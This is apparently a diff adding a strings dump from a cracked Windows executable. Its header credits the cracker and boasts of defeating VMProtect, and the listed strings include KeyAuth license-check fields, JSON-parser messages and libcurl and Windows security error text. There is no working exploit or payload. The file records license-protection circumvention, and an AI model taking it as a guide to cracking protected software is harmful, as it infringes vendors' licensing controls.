@@ -1,0 +1,1953 @@
+#############
+CRACKED BY kwsstas.westt#1312
+#############
+DONT DM FOR SUPPORT!!
+#############
+Galaxy < Suicide
+
+
+Offset	Size	Type	String
+00000188	05	A	.text
+000001af	07	A	`.rdata
+000001d7	06	A	@.data
+00000200	06	A	.pdata
+00000227	06	A	@.vmp0 ### VMP GOT FUCKED HEHE
+0000024f	06	A	`.vmp1
+00000278	05	A	.rsrc
+0000e4c3	05	A	D$<&
+0000e4db	06	A	D$xw{
+0000e4f0	05	A	D$4~&
+0001195d	05	A	D$L&
+00011984	05	A	D$Tr&
+00013255	05	A	D$L&
+0001326d	06	A	D$xw{
+00013282	05	A	D$D~&
+00013292	05	A	D$<i&
+000132aa	05	A	D$h{"
+000156f0	05	A	D$L&
+00015725	05	A	D$D~&
+00015749	05	A	D$<i&
+00015761	05	A	D$h{"
+00030770	05	A	D$P @
+00031628	05	A	D$T @
+0003f69c	07	A	unknown
+0003fd7c	07	A	unknown
+00045abf	07	A	(){ %*]
+0004da06	05	A	t`=A'
+00056814	06	A	t$8A8]
+0006b200	07	A	success
+0006b208	10	A	map/set too long
+0006b240	10	A	[json.exception.
+0006b270	0b	A	parse error
+0006b280	0b	A	parse_error
+0006b290	09	A	, column 
+0006b2a0	09	A	 at line 
+0006b2c8	0c	A	out_of_range
+0006b2d8	08	A	username
+0006b2f0	0a	A	createdate
+0006b300	09	A	lastlogin
+0006b310	0d	A	subscriptions
+0006b320	0c	A	subscription
+0006b330	06	A	expiry
+0006b338	08	A	numUsers
+0006b348	0e	A	numOnlineUsers
+0006b358	07	A	numKeys
+0006b360	07	A	version
+0006b368	11	A	customerPanelLink
+0006b380	07	A	message
+0006b430	0f	A	KeyAuth_Invalid
+0006b440	09	A	sessionid
+0006b450	07	A	appinfo
+0006b458	0a	A	invalidver
+0006b468	08	A	download
+0006b480	09	A	signature
+0006b4a8	0f	A	popen() failed!
+0006b4b8	14	A	certutil -hashfile "
+0006b4d0	10	A	xxxx?xxxx????xxx
+0006b500	0f	A	vector too long
+0006b510	05	A	value
+0006b518	0d	A	syntax error 
+0006b528	0e	A	while parsing 
+0006b540	0e	A	; last read: '
+0006b550	0b	A	unexpected 
+0006b560	0b	A	; expected 
+0006b570	08	A	<U+%.4X>
+0006b580	2c	A	invalid BOM; must be 0xEF 0xBB 0xBF if given
+0006b5b0	0f	A	invalid literal
+0006b5c0	0f	A	<uninitialized>
+0006b5d0	0c	A	true literal
+0006b5e0	0d	A	false literal
+0006b5f0	0c	A	null literal
+0006b600	0e	A	string literal
+0006b610	0e	A	number literal
+0006b638	0d	A	<parse error>
+0006b648	0c	A	end of input
+0006b658	16	A	'[', '{', or a literal
+0006b670	0d	A	unknown token
+0006b680	28	A	invalid number; expected digit after '-'
+0006b6b0	28	A	invalid number; expected digit after '.'
+0006b6e0	3a	A	invalid number; expected '+', '-', or digit after exponent
+0006b720	32	A	invalid number; expected digit after exponent sign
+0006b758	25	A	invalid comment; missing closing '*/'
+0006b780	2f	A	invalid comment; expecting '/' or '*' after '/'
+0006b7b0	25	A	invalid string: missing closing quote
+0006b7d8	35	A	invalid string: '\u' must be followed by 4 hex digits
+0006b810	4b	A	invalid string: surrogate U+D800..U+DBFF must be followed by U+DC00..U+DFFF
+0006b860	43	A	invalid string: surrogate U+DC00..U+DFFF must follow U+D800..U+DBFF
+0006b8a8	33	A	invalid string: forbidden character after backslash
+0006b8e0	48	A	invalid string: control character U+0000 (NUL) must be escaped to \u0000
+0006b930	48	A	invalid string: control character U+0001 (SOH) must be escaped to \u0001
+0006b980	48	A	invalid string: control character U+0002 (STX) must be escaped to \u0002
+0006b9d0	48	A	invalid string: control character U+0003 (ETX) must be escaped to \u0003
+0006ba20	48	A	invalid string: control character U+0004 (EOT) must be escaped to \u0004
+0006ba70	48	A	invalid string: control character U+0005 (ENQ) must be escaped to \u0005
+0006bac0	48	A	invalid string: control character U+0006 (ACK) must be escaped to \u0006
+0006bb10	48	A	invalid string: control character U+0007 (BEL) must be escaped to \u0007
+0006bb60	4d	A	invalid string: control character U+0008 (BS) must be escaped to \u0008 or \b
+0006bbb0	4d	A	invalid string: control character U+0009 (HT) must be escaped to \u0009 or \t
+0006bc00	4d	A	invalid string: control character U+000A (LF) must be escaped to \u000A or \n
+0006bc50	47	A	invalid string: control character U+000B (VT) must be escaped to \u000B
+0006bca0	4d	A	invalid string: control character U+000C (FF) must be escaped to \u000C or \f
+0006bcf0	4d	A	invalid string: control character U+000D (CR) must be escaped to \u000D or \r
+0006bd40	47	A	invalid string: control character U+000E (SO) must be escaped to \u000E
+0006bd90	47	A	invalid string: control character U+000F (SI) must be escaped to \u000F
+0006bde0	48	A	invalid string: control character U+0010 (DLE) must be escaped to \u0010
+0006be30	48	A	invalid string: control character U+0011 (DC1) must be escaped to \u0011
+0006be80	48	A	invalid string: control character U+0012 (DC2) must be escaped to \u0012
+0006bed0	48	A	invalid string: control character U+0013 (DC3) must be escaped to \u0013
+0006bf20	48	A	invalid string: control character U+0014 (DC4) must be escaped to \u0014
+0006bf70	48	A	invalid string: control character U+0015 (NAK) must be escaped to \u0015
+0006bfc0	48	A	invalid string: control character U+0016 (SYN) must be escaped to \u0016
+0006c010	48	A	invalid string: control character U+0017 (ETB) must be escaped to \u0017
+0006c060	48	A	invalid string: control character U+0018 (CAN) must be escaped to \u0018
+0006c0b0	47	A	invalid string: control character U+0019 (EM) must be escaped to \u0019
+0006c100	48	A	invalid string: control character U+001A (SUB) must be escaped to \u001A
+0006c150	48	A	invalid string: control character U+001B (ESC) must be escaped to \u001B
+0006c1a0	47	A	invalid string: control character U+001C (FS) must be escaped to \u001C
+0006c1f0	47	A	invalid string: control character U+001D (GS) must be escaped to \u001D
+0006c240	47	A	invalid string: control character U+001E (RS) must be escaped to \u001E
+0006c290	47	A	invalid string: control character U+001F (US) must be escaped to \u001F
+0006c2d8	25	A	invalid string: ill-formed UTF-8 byte
+0006c300	15	A	vector<bool> too long
+0006c318	0a	A	object key
+0006c328	10	A	object separator
+0006c340	19	A	number overflow parsing '
+0006c35c	05	A	array
+0006c364	06	A	object
+0006c485	25	A	""&++p8<s942+1i,9# n+1":1;4@rjjstr=wq
+0006c5c0	08	A	No error
+0006c5d0	14	A	Unsupported protocol
+0006c5e8	15	A	Failed initialization
+0006c600	2b	A	URL using bad/illegal format or missing URL
+0006c630	6c	A	A requested feature, protocol or option was not found built-in in this libcurl due to a build-time decision.
+0006c6a0	1b	A	Couldn't resolve proxy name
+0006c6c0	1a	A	Couldn't resolve host name
+0006c6e0	1a	A	Couldn't connect to server
+0006c700	12	A	Weird server reply
+0006c718	20	A	Access denied to remote resource
+0006c740	2e	A	FTP: The server failed to connect to data port
+0006c770	2b	A	FTP: Accepting server connect has timed out
+0006c7a0	30	A	FTP: The server did not accept the PRET command.
+0006c7d8	17	A	FTP: unknown PASS reply
+0006c7f0	17	A	FTP: unknown PASV reply
+0006c808	20	A	FTP: unknown 227 response format
+0006c830	33	A	FTP: can't figure out the host in the PASV response
+0006c868	20	A	Error in the HTTP2 framing layer
+0006c890	1b	A	FTP: couldn't set file type
+0006c8b0	1a	A	Transferred a partial file
+0006c8d0	37	A	FTP: couldn't retrieve (RETR failed) the specified file
+0006c908	1c	A	Quote command returned error
+0006c928	1d	A	HTTP response code said error
+0006c948	30	A	Failed writing received data to disk/application
+0006c980	2b	A	Upload failed (at start/before it took off)
+0006c9b0	34	A	Failed to open/read local data from file/application
+0006c9e8	0d	A	Out of memory
+0006c9f8	13	A	Timeout was reached
+0006ca10	18	A	FTP: command PORT failed
+0006ca30	18	A	FTP: command REST failed
+0006ca50	2f	A	Requested range was not delivered by the server
+0006ca80	24	A	Internal problem setting up the POST
+0006caa8	11	A	SSL connect error
+0006cac0	18	A	Couldn't resume download
+0006cae0	1c	A	Couldn't read a file:// file
+0006cb00	11	A	LDAP: cannot bind
+0006cb18	13	A	LDAP: search failed
+0006cb30	30	A	A required function in the library was not found
+0006cb68	30	A	Operation was aborted by an application callback
+0006cba0	2b	A	A libcurl function was given a bad argument
+0006cbd0	23	A	Failed binding local connection end
+0006cbf8	26	A	Number of redirects hit maximum amount
+0006cc20	2a	A	An unknown option was passed in to libcurl
+0006cc50	17	A	Malformed telnet option
+0006cc68	2d	A	Server returned nothing (no headers, no data)
+0006cc98	1b	A	SSL crypto engine not found
+0006ccb8	28	A	Can not set SSL crypto engine as default
+0006cce8	26	A	Failed to initialise SSL crypto engine
+0006cd10	1f	A	Failed sending data to the peer
+0006cd30	29	A	Failure when receiving data from the peer
+0006cd60	26	A	Problem with the local SSL certificate
+0006cd88	21	A	Couldn't use specified SSL cipher
+0006cdb0	31	A	SSL peer certificate or SSH remote key was not OK
+0006cde8	33	A	Problem with the SSL CA cert (path? access rights?)
+0006ce20	35	A	Unrecognized or bad HTTP Content or Transfer-Encoding
+0006ce58	10	A	Invalid LDAP URL
+0006ce70	1a	A	Maximum file size exceeded
+0006ce90	1a	A	Requested SSL level failed
+0006ceb0	26	A	Failed to shut down the SSL connection
+0006ced8	37	A	Failed to load CRL file (path? access rights?, format?)
+0006cf10	2c	A	Issuer check against peer certificate failed
+0006cf40	35	A	Send failed since rewinding of the data stream failed
+0006cf78	0c	A	Login denied
+0006cf88	14	A	TFTP: File Not Found
+0006cfa0	16	A	TFTP: Access Violation
+0006cfb8	20	A	Disk full or allocation exceeded
+0006cfe0	17	A	TFTP: Illegal operation
+0006cff8	19	A	TFTP: Unknown transfer ID
+0006d018	1a	A	Remote file already exists
+0006d038	12	A	TFTP: No such user
+0006d050	11	A	Conversion failed
+0006d068	33	A	Caller must register CURLOPT_CONV_ callback options
+0006d0a0	15	A	Remote file not found
+0006d0b8	16	A	Error in the SSH layer
+0006d0d0	1e	A	Socket not ready for send/recv
+0006d0f0	22	A	RTSP CSeq mismatch or invalid CSeq
+0006d118	12	A	RTSP session error
+0006d130	1d	A	Unable to parse FTP file list
+0006d150	15	A	Chunk callback failed
+0006d168	23	A	The max connection limit is reached
+0006d190	2f	A	SSL public key does not match pinned public key
+0006d1c0	31	A	SSL server certificate status verification FAILED
+0006d1f8	28	A	Stream error in the HTTP/2 framing layer
+0006d228	28	A	API function called from within callback
+0006d258	2c	A	An authentication function returned an error
+0006d288	0c	A	HTTP/3 error
+0006d298	15	A	QUIC connection error
+0006d2b0	0d	A	Unknown error
+0006d2c0	10	A	Call interrupted
+0006d2d8	08	A	Bad file
+0006d2e8	0a	A	Bad access
+0006d2f8	0c	A	Bad argument
+0006d308	11	A	Invalid arguments
+0006d320	17	A	Out of file descriptors
+0006d338	10	A	Call would block
+0006d350	19	A	Blocking call in progress
+0006d370	1a	A	Descriptor is not a socket
+0006d390	18	A	Need destination address
+0006d3b0	10	A	Bad message size
+0006d3c8	0c	A	Bad protocol
+0006d3d8	1e	A	Protocol option is unsupported
+0006d3f8	17	A	Protocol is unsupported
+0006d410	15	A	Socket is unsupported
+0006d428	17	A	Operation not supported
+0006d440	1c	A	Address family not supported
+0006d460	1d	A	Protocol family not supported
+0006d480	16	A	Address already in use
+0006d498	15	A	Address not available
+0006d4b0	0c	A	Network down
+0006d4c0	13	A	Network unreachable
+0006d4d8	16	A	Network has been reset
+0006d4f0	16	A	Connection was aborted
+0006d508	14	A	Connection was reset
+0006d520	0f	A	No buffer space
+0006d530	1b	A	Socket is already connected
+0006d550	17	A	Socket is not connected
+0006d568	19	A	Socket has been shut down
+0006d588	13	A	Too many references
+0006d5a0	09	A	Timed out
+0006d5b0	12	A	Connection refused
+0006d5c4	06	A	Loop??
+0006d5d0	0d	A	Name too long
+0006d5e0	09	A	Host down
+0006d5f0	10	A	Host unreachable
+0006d608	09	A	Not empty
+0006d618	15	A	Process limit reached
+0006d630	0e	A	Too many users
+0006d640	09	A	Bad quota
+0006d650	12	A	Something is stale
+0006d668	0c	A	Remote error
+0006d678	0c	A	Disconnected
+0006d688	1c	A	Winsock library is not ready
+0006d6a8	1f	A	Winsock library not initialised
+0006d6c8	1d	A	Winsock version not supported
+0006d6e8	0e	A	Host not found
+0006d6f8	19	A	Host not found, try again
+0006d718	29	A	Unrecoverable error in call to nameserver
+0006d748	20	A	No data record of requested type
+0006d770	16	A	Unknown error %d (%#x)
+0006d788	19	A	Unknown error %u (0x%08X)
+0006d7a8	0f	A	CRYPT_E_REVOKED
+0006d7b8	18	A	SEC_E_ALGORITHM_MISMATCH
+0006d7d8	12	A	SEC_E_BAD_BINDINGS
+0006d7f0	0f	A	SEC_E_BAD_PKGID
+0006d800	16	A	SEC_E_BUFFER_TOO_SMALL
+0006d818	14	A	SEC_E_CANNOT_INSTALL
+0006d830	11	A	SEC_E_CANNOT_PACK
+0006d848	12	A	SEC_E_CERT_EXPIRED
+0006d860	12	A	SEC_E_CERT_UNKNOWN
+0006d878	16	A	SEC_E_CERT_WRONG_USAGE
+0006d890	15	A	SEC_E_CONTEXT_EXPIRED
+0006d8a8	23	A	SEC_E_CROSSREALM_DELEGATION_FAILURE
+0006d8d0	1b	A	SEC_E_CRYPTO_SYSTEM_INVALID
+0006d8f0	15	A	SEC_E_DECRYPT_FAILURE
+0006d908	17	A	SEC_E_DELEGATION_POLICY
+0006d920	19	A	SEC_E_DELEGATION_REQUIRED
+0006d940	18	A	SEC_E_DOWNGRADE_DETECTED
+0006d960	15	A	SEC_E_ENCRYPT_FAILURE
+0006d978	1c	A	SEC_E_INCOMPLETE_CREDENTIALS
+0006d998	18	A	SEC_E_INCOMPLETE_MESSAGE
+0006d9b8	19	A	SEC_E_INSUFFICIENT_MEMORY
+0006d9d8	14	A	SEC_E_INTERNAL_ERROR
+0006d9f0	14	A	SEC_E_INVALID_HANDLE
+0006da08	17	A	SEC_E_INVALID_PARAMETER
+0006da20	13	A	SEC_E_INVALID_TOKEN
+0006da38	1a	A	SEC_E_ISSUING_CA_UNTRUSTED
+0006da58	1e	A	SEC_E_ISSUING_CA_UNTRUSTED_KDC
+0006da78	16	A	SEC_E_KDC_CERT_EXPIRED
+0006da90	16	A	SEC_E_KDC_CERT_REVOKED
+0006daa8	19	A	SEC_E_KDC_INVALID_REQUEST
+0006dac8	19	A	SEC_E_KDC_UNABLE_TO_REFER
+0006dae8	17	A	SEC_E_KDC_UNKNOWN_ETYPE
+0006db00	12	A	SEC_E_LOGON_DENIED
+0006db18	1c	A	SEC_E_MAX_REFERRALS_EXCEEDED
+0006db38	15	A	SEC_E_MESSAGE_ALTERED
+0006db50	17	A	SEC_E_MULTIPLE_ACCOUNTS
+0006db68	11	A	SEC_E_MUST_BE_KDC
+0006db80	0f	A	SEC_E_NOT_OWNER
+0006db90	21	A	SEC_E_NO_AUTHENTICATING_AUTHORITY
+0006dbb8	14	A	SEC_E_NO_CREDENTIALS
+0006dbd0	16	A	SEC_E_NO_IMPERSONATION
+0006dbe8	15	A	SEC_E_NO_IP_ADDRESSES
+0006dc00	11	A	SEC_E_NO_KERB_KEY
+0006dc18	10	A	SEC_E_NO_PA_DATA
+0006dc30	19	A	SEC_E_NO_S4U_PROT_SUPPORT
+0006dc50	12	A	SEC_E_NO_TGT_REPLY
+0006dc68	15	A	SEC_E_OUT_OF_SEQUENCE
+0006dc80	1b	A	SEC_E_PKINIT_CLIENT_FAILURE
+0006dca0	1a	A	SEC_E_PKINIT_NAME_MISMATCH
+0006dcc0	16	A	SEC_E_POLICY_NLTM_ONLY
+0006dcd8	17	A	SEC_E_QOP_NOT_SUPPORTED
+0006dcf0	1a	A	SEC_E_REVOCATION_OFFLINE_C
+0006dd10	1c	A	SEC_E_REVOCATION_OFFLINE_KDC
+0006dd30	16	A	SEC_E_SECPKG_NOT_FOUND
+0006dd48	19	A	SEC_E_SECURITY_QOS_FAILED
+0006dd68	1a	A	SEC_E_SHUTDOWN_IN_PROGRESS
+0006dd88	1c	A	SEC_E_SMARTCARD_CERT_EXPIRED
+0006dda8	1c	A	SEC_E_SMARTCARD_CERT_REVOKED
+0006ddc8	1e	A	SEC_E_SMARTCARD_LOGON_REQUIRED
+0006dde8	21	A	SEC_E_STRONG_CRYPTO_NOT_SUPPORTED
+0006de10	14	A	SEC_E_TARGET_UNKNOWN
+0006de28	0f	A	SEC_E_TIME_SKEW
+0006de38	19	A	SEC_E_TOO_MANY_PRINCIPALS
+0006de58	20	A	SEC_E_UNFINISHED_CONTEXT_DELETED
+0006de80	19	A	SEC_E_UNKNOWN_CREDENTIALS
+0006dea0	1a	A	SEC_E_UNSUPPORTED_FUNCTION
+0006dec0	19	A	SEC_E_UNSUPPORTED_PREAUTH
+0006dee0	14	A	SEC_E_UNTRUSTED_ROOT
+0006def8	1d	A	SEC_E_WRONG_CREDENTIAL_HANDLE
+0006df18	15	A	SEC_E_WRONG_PRINCIPAL
+0006df30	1b	A	SEC_I_COMPLETE_AND_CONTINUE
+0006df50	15	A	SEC_I_COMPLETE_NEEDED
+0006df68	15	A	SEC_I_CONTEXT_EXPIRED
+0006df80	15	A	SEC_I_CONTINUE_NEEDED
+0006df98	1c	A	SEC_I_INCOMPLETE_CREDENTIALS
+0006dfb8	11	A	SEC_I_LOCAL_LOGON
+0006dfd0	14	A	SEC_I_NO_LSA_CONTEXT
+0006dfe8	11	A	SEC_I_RENEGOTIATE
+0006e000	16	A	SEC_I_SIGNATURE_NEEDED
+0006e020	b8	A	SEC_E_ILLEGAL_MESSAGE (0x%08X) - This error usually occurs when a fatal SSL/TLS alert is received (e.g. handshake failed). More detail may be available in the Windows System event log.
+0006e0e0	0b	A	%s (0x%08X)
+0006e0f0	07	A	%s - %s
+0006e0f8	28	A	easy handle already used in multi handle
+0006e130	05	A	FLUSH
+0006e138	06	A	RELOAD
+0006e140	0b	A	Set-Cookie:
+0006e180	44	A	6666666666666666\\\\\\\\\\\\\\\\0123456789abcdefghijklmnopqrstuvwxyz
+0006e1c8	24	A	0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ
+0006e1f0	05	A	(nil)
+0006e1f8	05	A	(nil)
+0006e2b8	26	A	Connection #%ld to host %s left intact
+0006e310	2c	A	Resolving timed out after %I64d milliseconds
+0006e340	2d	A	Connection timed out after %I64d milliseconds
+0006e370	53	A	Operation timed out after %I64d milliseconds with %I64d out of %I64d bytes received
+0006e3d0	46	A	Operation timed out after %I64d milliseconds with %I64d bytes received
+0006e4f0	09	A	localhost
+0006e558	09	A	__Secure-
+0006e568	07	A	__Host-
+0006e570	06	A	secure
+0006e578	08	A	httponly
+0006e58c	06	A	domain
+0006e5c8	07	A	max-age
+0006e5d0	07	A	expires
+0006e5d8	0a	A	#HttpOnly_
+0006e5f0	05	A	FALSE
+0006e5f8	08	A	Replaced
+0006e604	05	A	Added
+0006e650	07	A	unknown
+0006e678	09	A	%s.%s.tmp
+0006e76c	05	A	proxy
+0006e780	18	A	Could not resolve %s: %s
+0006e900	40	A	ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
+0006ea50	10	A	0123456789ABCDEF
+0006ea70	09	A	image/gif
+0006ea88	0a	A	image/jpeg
+0006ea94	05	A	.jpeg
+0006eaa8	09	A	image/png
+0006eac0	0d	A	image/svg+xml
+0006ead8	0a	A	text/plain
+0006eaf0	09	A	text/html
+0006eafc	05	A	.html
+0006eb10	0f	A	application/pdf
+0006eb28	0f	A	application/xml
+0006eb38	06	A	binary
+0006eb50	06	A	base64
+0006eb58	10	A	quoted-printable
+0006eb70	0c	A	Content-Type
+0006eb98	1e	A	Can't add itself as a subpart!
+0006ebb8	0b	A	; boundary=
+0006ebc8	14	A	Content-Type: %s%s%s
+0006ebe0	0f	A	multipart/mixed
+0006ebf0	18	A	application/octet-stream
+0006ec10	13	A	Content-Disposition
+0006ec28	0a	A	multipart/
+0006ec38	0a	A	attachment
+0006ec48	0c	A	; filename="
+0006ec58	08	A	; name="
+0006ec68	23	A	Content-Disposition: %s%s%s%s%s%s%s
+0006ec90	19	A	Content-Transfer-Encoding
+0006ecb0	1d	A	Content-Transfer-Encoding: %s
+0006ecd0	13	A	multipart/form-data
+0006ece8	09	A	form-data
+0006ed00	15	A	----------------%ld%s
+0006ee10	05	A	multi
+0006ee18	3a	A	Unrecognized parameter value passed via CURLOPT_SSLVERSION
+0006ee58	35	A	CURL_SSLVERSION_MAX incompatible with CURL_SSLVERSION
+0006ee98	1a	A	-----BEGIN PUBLIC KEY-----
+0006eeb9	18	A	-----END PUBLIC KEY-----
+0006eed8	08	A	sha256//
+0006ef08	09	A	;sha256//
+0006ef20	08	A	%s%s%s%s
+0006ef30	10	A	CURL_SSL_BACKEND
+0006f088	0d	A	<no protocol>
+0006f110	0d	A	can multiplex
+0006f120	08	A	serially
+0006f320	32	A	Protocol "%s" not supported or disabled in libcurl
+0006f370	07	A	%s://%s
+0006f380	06	A	%I64d-
+0006f390	06	A	_proxy
+0006f398	0a	A	http_proxy
+0006f3a8	09	A	all_proxy
+0006f3b8	09	A	ALL_PROXY
+0006f3ec	05	A	https
+0006f3f8	07	A	socks5h
+0006f400	06	A	socks5
+0006f408	07	A	socks4a
+0006f410	06	A	socks4
+0006f418	05	A	socks
+0006f428	21	A	Unsupported proxy scheme for '%s'
+0006f450	20	A	Unsupported proxy syntax in '%s'
+0006f480	49	A	Unsupported proxy '%s', libcurl is built without the HTTPS-proxy support.
+0006f4d0	0f	A	memory shortage
+0006f4e0	08	A	no_proxy
+0006f4f0	08	A	NO_PROXY
+0006f540	09	A	anonymous
+0006f550	0f	A	ftp@example.com
+0006f5f8	06	A	%s%s%s
+0006f638	1f	A	Unix socket path too long: '%s'
+0006f658	1a	A	Couldn't resolve host '%s'
+0006f678	1b	A	Couldn't resolve proxy '%s'
+0006f7f0	10	A	Send failure: %s
+0006f808	10	A	Recv failure: %s
+0006f820	32	A	Write callback asked for PAUSE when not supported!
+0006f858	20	A	Failed writing body (%zu != %zu)
+0006f880	15	A	Failed writing header
+0006f89c	05	A	host!
+0006f900	1f	A	Couldn't bind to interface '%s'
+0006f988	15	A	Couldn't bind to '%s'
+0006f9a0	26	A	getsockname() failed with errno %d: %s
+0006fa10	1d	A	bind failed with errno %d: %s
+0006fa30	26	A	getpeername() failed with errno %d: %s
+0006fa58	2a	A	ssrem inet_ntop() failed with errno %d: %s
+0006fa88	2a	A	ssloc inet_ntop() failed with errno %d: %s
+0006fab8	1e	A	unknown proxytype option given
+0006fad8	13	A	Connection time-out
+0006fb58	24	A	Failed to connect to %s port %ld: %s
+0006fba0	2c	A	sa_addr inet_ntop() failed with errno %d: %s
+0006fc0c	06	A	Digest
+0006fc1c	06	A	Proxy-
+0006fc48	0c	A	iphlpapi.dll
+0006fc58	0e	A	if_nametoindex
+0006fc68	08	A	kernel32
+0006fc78	0e	A	LoadLibraryExA
+0006fc90	0f	A	AddDllDirectory
+0006fd40	08	A	identity
+0006fd50	4d	A	Unrecognized content encoding type. libcurl understands %s content encodings.
+0006fda0	07	A	chunked
+0006ff98	05	A	%s:%d
+0006ffa0	07	A	CONNECT
+0006ffb0	09	A	%s%s%s:%d
+0006ffd8	10	A	Proxy-Connection
+00070010	0a	A	User-Agent
+00070034	08	A	%s%s%s%s
+00070040	1f	A	Failed sending CONNECT to proxy
+00070060	24	A	Proxy CONNECT aborted due to timeout
+00070088	1b	A	CONNECT response too large!
+000700d0	15	A	Proxy CONNECT aborted
+00070148	11	A	WWW-Authenticate:
+00070160	13	A	Proxy-authenticate:
+00070178	0f	A	Content-Length:
+000701bc	05	A	close
+000701c8	0b	A	Connection:
+000701d8	12	A	Transfer-Encoding:
+00070248	11	A	Proxy-Connection:
+00070260	0c	A	HTTP/1.%d %d
+00070290	2e	A	Received HTTP code %d from proxy after CONNECT
+00070328	2c	A	Unable to allocate trailing headers buffer !
+00070358	2e	A	operation aborted by trailing headers callback
+000703b0	1d	A	operation aborted by callback
+000703d0	31	A	Read callback asked for PAUSE when not supported!
+00070408	22	A	read function returned funny value
+00070430	05	A	%zx%s
+000704a8	1c	A	Cannot rewind mime/post data
+000704c8	1f	A	seek callback returned error %d
+00070508	20	A	ioctl callback returned error %d
+00070530	25	A	necessary data rewind wasn't possible
+00070610	29	A	The entire document is already downloaded
+00070640	3f	A	HTTP server doesn't seem to support byte ranges. Cannot resume.
+000706a0	29	A	Failed reading the chunked-encoded stream
+000706d0	16	A	%s in chunked-encoding
+000707b0	1f	A	Failed to alloc scratch buffer!
+000707f8	1a	A	select/poll returned error
+00070838	32	A	transfer closed with %I64d bytes remaining to read
+00070870	34	A	transfer closed with outstanding read data remaining
+000708a8	0b	A	No URL set!
+000708b8	20	A	Maximum (%ld) redirects followed
+00070978	30	A	Connection died, tried %d times before giving up
+00070a10	16	A	Shuffling %i addresses
+00070a50	0b	A	%255[^:]:%d
+00070cc0	05	A	HTTPS
+00070cc8	22	A	HTTP/3 requested for non-HTTPS URL
+00070cec	05	A	%s:%s
+00070dc8	19	A	Forcing HTTP/1.1 for NTLM
+00070de8	24	A	The requested URL returned error: %d
+00070e10	09	A	Negotiate
+00070e28	13	A	Proxy-authorization
+00070e40	0d	A	Authorization
+00070e50	05	A	Basic
+00070e58	0e	A	Authorization:
+00070e68	06	A	Bearer
+00070e70	05	A	Proxy
+00070e78	06	A	Server
+00070f28	17	A	Empty reply from server
+00070f40	06	A	Expect
+00070f48	0c	A	100-continue
+00070f58	07	A	Expect:
+00070f80	30	A	Malformatted trailing header ! Skipping trailer.
+00070fb4	05	A	Host:
+00070fc0	0d	A	Content-Type:
+00070fd0	07	A	Cookie:
+00070fe0	11	A	Invalid TIMEVALUE
+00070ff8	11	A	If-Modified-Since
+00071010	13	A	If-Unmodified-Since
+00071028	0d	A	Last-Modified
+00071070	07	A	OPTIONS
+00071078	05	A	%s?%s
+00071080	07	A	Referer
+00071098	06	A	Cookie
+000710a0	0f	A	Accept-Encoding
+000710c8	11	A	Transfer-Encoding
+000710e0	2a	A	Chunky upload is not supported by HTTP 1.0
+00071168	06	A	;type=
+00071170	08	A	;type=%c
+0007117c	06	A	Accept
+00071198	15	A	Could not seek stream
+000711b0	2a	A	Could only read %I64d bytes from the input
+000711e0	20	A	File already completely uploaded
+00071204	05	A	Range
+00071228	0d	A	Content-Range
+000712b0	0e	A	ftp://%s:%s@%s
+000712d4	18	A	%s%s%s%s%s%s%s%s%s%s%s%s
+000712f0	08	A	Cookie: 
+00071300	07	A	%s%s=%s
+00071308	0e	A	Content-Length
+00071330	1a	A	Failed sending PUT request
+00071368	1b	A	Failed sending POST request
+000713d0	20	A	Failed sending HTTP POST request
+000713f8	1b	A	Failed sending HTTP request
+00071450	05	A	HTTP/
+00071458	05	A	RTSP/
+00071460	26	A	Rejected %zu bytes header (max is %d)!
+00071488	26	A	Failed to alloc memory for big header!
+000714b0	24	A	The requested URL returned error: %s
+00071638	12	A	 HTTP/%1d.%1d%c%3d
+00071650	0f	A	 HTTP/%1[23] %d
+000716b0	09	A	 HTTP %3d
+000716c0	24	A	Unsupported HTTP version in response
+000716e8	12	A	 RTSP/%1d.%1d%c%3d
+00071750	1d	A	Invalid Content-Length: value
+00071770	0a	A	keep-alive
+00071800	11	A	Content-Encoding:
+00071818	0c	A	Retry-After:
+00071828	0e	A	Content-Range:
+00071838	0e	A	Last-Modified:
+00071848	0f	A	Persistent-Auth
+00071858	05	A	false
+00071860	2f	A	Negotiate: noauthpersist -> %d, header part: %s
+00071890	09	A	Location:
+000718a0	08	A	--:--:--
+000718b0	16	A	%2I64d:%02I64d:%02I64d
+000718c8	10	A	%3I64dd %02I64dh
+000718e0	07	A	%7I64dd
+000718e8	06	A	%5I64d
+000718f0	07	A	%4I64dk
+000718f8	0e	A	%2I64d.%0I64dM
+00071908	07	A	%4I64dM
+00071910	0e	A	%2I64d.%0I64dG
+00071920	07	A	%4I64dG
+00071928	07	A	%4I64dT
+00071930	07	A	%4I64dP
+00071a19	33	A	%3I64d %s  %3I64d %s  %3I64d %s  %s  %s %s %s %s %s
+00071a50	10	A	Callback aborted
+00071a6f	4d	A	@Operation too slow. Less than %ld bytes/sec transferred the last %ld seconds
+00071bb8	2a	A	Failed to resolve "%s" for SOCKS4 connect.
+00071c10	1a	A	SOCKS4: too long host name
+00071c30	26	A	Failed to send SOCKS4 connect request.
+00071c58	30	A	SOCKS4: Failed receiving connect request ack: %s
+00071c90	34	A	SOCKS4 reply has wrong version, version should be 0.
+00071cf0	55	A	Can't complete SOCKS4 connection to %d.%d.%d.%d:%d. (%d), request rejected or failed.
+00071d50	87	A	Can't complete SOCKS4 connection to %d.%d.%d.%d:%d. (%d), request rejected because SOCKS server cannot connect to identd on the client.
+00071de0	8b	A	Can't complete SOCKS4 connection to %d.%d.%d.%d:%d. (%d), request rejected because the client program and identd report different user-ids.
+00071e70	42	A	Can't complete SOCKS4 connection to %d.%d.%d.%d:%d. (%d), Unknown.
+00071f88	26	A	Unable to send initial SOCKS5 request.
+00071fb0	2a	A	Unable to receive initial SOCKS5 response.
+00071fe0	34	A	Received invalid version in initial SOCKS5 response.
+00072018	2b	A	Unable to negotiate SOCKS5 GSS-API context.
+00072048	3a	A	SOCKS5 GSSAPI per-message authentication is not supported.
+00072088	28	A	No authentication method was acceptable.
+000720b8	38	A	Undocumented SOCKS5 mode attempted to be used by server.
+000720f8	29	A	Excessive user name length for proxy auth
+00072128	28	A	Excessive password length for proxy auth
+00072158	2e	A	Failed to send SOCKS5 sub-negotiation request.
+00072188	32	A	Unable to receive SOCKS5 sub-negotiation response.
+000721c0	2f	A	User was rejected by the SOCKS5 server (%d %d).
+00072210	2a	A	Failed to resolve "%s" for SOCKS5 connect.
+000722f8	2e	A	SOCKS5 GSS-API protection not yet implemented.
+00072328	26	A	Failed to send SOCKS5 connect request.
+00072350	2d	A	Failed to receive SOCKS5 connect request ack.
